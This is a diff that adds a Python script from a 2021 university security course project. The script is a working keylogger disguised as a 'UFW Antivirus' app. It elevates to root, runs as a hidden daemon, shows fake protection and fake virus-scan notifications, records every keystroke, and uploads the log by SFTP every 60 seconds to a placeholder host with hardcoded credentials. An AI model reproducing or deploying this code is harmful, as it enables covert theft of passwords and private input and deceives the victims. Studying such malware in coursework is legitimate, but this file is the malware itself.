@@ -1,0 +1,268 @@
+#! /usr/bin/python3
+#  ==============================================================================
+#   Assignment:  Term Project
+#
+#       Author:  Radu Cernatescu, Karandeep Ubhi, Kateryna Vaizer
+#     Language:  Python3, argparse, keyboard, logzero, elevate, paramiko
+#   To Compile:  n/a
+#
+#        Class:  DPI912 - Python for Programmers: Sockets and Security
+#    Professor:  Harvey Kaduri
+#     Due Date:  June 28th, 2021 - 12:00 pm
+#    Submitted:  June 28th, 2021 - 10:30 am
+#
+#  -----------------------------------------------------------------------------
+#
+#  Description:  An app that pretends to be an antivirus and implements
+#                keylogging to get the victim's key strokes.
+#
+#  Collaboration:  Collaboration in a group
+#
+#        Input:  N/A
+#
+#       Output:  N/A
+#
+#    Algorithm:  This client prints messages for the user to pretend to be
+#                an antivirus, does keylogging on the background and sends the
+#                file with logs to the server every 60 seconds
+#
+#   Required Features Not Included:  N/A
+#
+#   Known Bugs:  N/A
+#
+#   Classification: Client
+#
+#  ==============================================================================
+import argparse
+from socket import *
+import os
+import subprocess
+import sys
+import signal
+import errno
+import threading
+import time
+import logzero
+from logzero import logger
+import atexit
+from sys import *
+import keyboard
+from elevate import elevate
+import threading
+import paramiko
+from paramiko import transport
+
+
+def sendFile():
+    threading.Timer(60, sendFile).start()
+
+    logger.info("File sending thread started...")
+    try:
+        transport = paramiko.Transport(('x.x.x.x', 22))
+
+        transport.banner_timeout = 60
+
+        #  The SFTP server we implemented uses a key file
+        #  however we tested on a server using Normal auth.
+        #  Uncomment these lines to connect to SFTP_Server.py
+        #  and comment out line 71
+        #  serverKey = paramiko.RSAKey.from_private_key_file('path/to/ufw.txt')
+        #  transport.connect(username='user', hostkey=server_key)
+        transport.connect(username='user', password='password')
+
+        sftp = paramiko.SFTPClient.from_transport(transport)
+
+        sftp.put('/tmp/ufw_tmp', '/home/ufw_tmp')
+
+        logger.info("Sent file successfully.")
+
+        sftp.close()
+        transport.close()
+
+    except Exception as e:
+        logger.error(e)
+
+
+def startAntiVirus(pidfile, ufwExecutor,
+                   stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
+    try:
+        processId = os.fork()
+    except OSError:
+        logger.error("Cannot create child process (Fork #1 failed).")
+        sys.exit(1)
+
+    if (processId > 0):
+        raise SystemExit(0)
+
+    try:
+        logger.info("Creating pidfile directory in /var/run/...")
+        os.mkdir('/var/run/ufw')
+        os.chmod('/var/run/ufw', 0o1711)
+    except:
+        logger.info("There already exists a "
+                    "folder in /var/run/, continuing...")
+
+    os.chdir('/tmp')
+    os.setsid()
+
+    try:
+        processId = os.fork()
+    except OSError:
+        logger.error("Cannot create child process (Fork #2 failed).")
+        sys.exit(1)
+
+    if (processId > 0):
+        raise SystemExit(0)
+
+    sys.stdout.flush()
+    sys.stderr.flush()
+
+    with open(stdin, "rb", 0) as f:
+        os.dup2(f.fileno(),  sys.stdin.fileno())
+
+    with open(stdout, "ab",  0) as f:
+        os.dup2(f.fileno(),  sys.stdout.fileno())
+
+    with open(stderr, "ab",  0) as f:
+        os.dup2(f.fileno(),  sys.stderr.fileno())
+
+    with open(pidfile, 'w') as f:
+        print(os.getpid(), file=f)
+    os.chmod(pidfile, 0o1711)
+
+    atexit.register(lambda: os.remove(pidfile))
+
+    def handleSIGHUP(signum, frame):
+        logger.info("Soft reset of antivirus...")
+
+    def handleSIGTERM(signum, frame):
+        logger.info("Shutting down antivirus...")
+        os.system('rm /tmp/ufw_executor')
+        raise SystemExit(0)
+
+    signal.signal(signal.SIGHUP, handleSIGHUP)
+    signal.signal(signal.SIGTERM, handleSIGTERM)
+
+    os.system(
+        f"DISPLAY=:0.0 su {ufwExecutor} -c "
+        "'notify-send \"UFW Antivirus\" \"Antivirus started... Blocking"
+        " enabled\" -u critical'")
+
+    def getKey(event):
+        keyLoggerFile = open("ufw_tmp", "a")
+        name = event.name
+
+        if len(name) > 1:
+            if name == "space":
+                name = " "
+            elif name == "enter":
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+
+        keyLoggerFile.write(name)
+        keyLoggerFile.close()
+
+    sendFile()
+    keyboard.on_release(callback=getKey)
+
+    keyboard.wait()
+
+
+def isRunning(PIDFILE):
+    if os.path.exists(PIDFILE):
+        return True
+    else:
+        return False
+
+
+if __name__ == "__main__":
+    PIDFILE = '/var/run/ufw/ufw_daemon.pid'
+
+    parseSwitches = argparse.ArgumentParser(
+        description="UFW Antivirus Home "
+        "edition. Note: Type status to see if it is running. Make sure it is "
+        "ALWAYS! Type 'ufw_antivirus -h' for help.")
+    switchGroup = parseSwitches.add_mutually_exclusive_group()
+
+    switchGroup.add_argument('-off', action='store_true',
+                             help='Stops the antivirus.'
+                             ' ONLY FOR ADVANCED USERS!')
+
+    parseSwitches.add_argument('-status',
+                               help='Output the status of the antivirus',
+                               required=False, action='store_true')
+    switchGroup.add_argument('-scan',
+                             help='Scans the filesystem for antiviruses.',
+                             required=False, action='store_true')
+
+    try:
+        arguments = parseSwitches.parse_args()
+    except:
+        exit()
+
+    if (os.getuid() != 0):
+        ufwExecutorFile = open('/tmp/ufw_executor', 'w')
+        id = os.getuid()
+
+        executor = subprocess.run(['getent', 'passwd', f'{id}'],
+                                  capture_output=True)
+        extractedExecutor = subprocess.run(
+            ['cut', '-d:', '-f1'],
+            input=executor.stdout,
+            capture_output=True).stdout.decode("utf-8")
+        ufwExecutorFile.write(extractedExecutor)
+        ufwExecutorFile.close()
+    else:
+        logzero.logfile(
+            "/tmp/ufw_daemon.log",
+            maxBytes=1e6, backupCount=3, disableStderrLogger=True)
+
+    try:
+        ufwExecutorFile = open('/tmp/ufw_executor', 'r')
+        ufwExecutor = ufwExecutorFile.read().rstrip()
+        ufwExecutorFile.close()
+    except:
+        print("ERROR: Unable to get executor;"
+              " please do not run the program as root.")
+        exit()
+
+    if (arguments.off):
+        if os.path.exists(PIDFILE):
+            elevate()
+            with open(PIDFILE) as f:
+                os.kill(int(f.read()),  signal.SIGTERM)
+
+        else:
+            print('The anti-virus is not running! '
+                  'Blocking is NOT enabled.', file=sys.stderr)
+
+        raise SystemExit(0)
+
+    if (arguments.status):
+        if (isRunning(PIDFILE)):
+            print("The antivirus is running!")
+            exit()
+        else:
+            print("FATAL ERROR: You are not protected! "
+                  "Please enter 'ufw_antivirus' and hit ENTER.")
+            exit()
+
+    if (arguments.scan):
+        os.system("DISPLAY=:0.0 notify-send \"UFW Antivirus\" "
+                  "\"System scan started...\"")
+        time.sleep(random.randint(30, 45))
+        os.system("DISPLAY=:0.0 notify-send \"UFW Antivirus\" "
+                  "\"Found {random.randint(1, 10)} viruses! "
+                  "They have been quarantined and deleted.\"")
+
+    if (not arguments.off and not arguments.scan):
+        if (not isRunning(PIDFILE)):
+                elevate()
+                startAntiVirus(PIDFILE, ufwExecutor)
+        else:
+            print('The anti-virus is already running!', file=sys.stderr)
+            raise SystemExit(0)
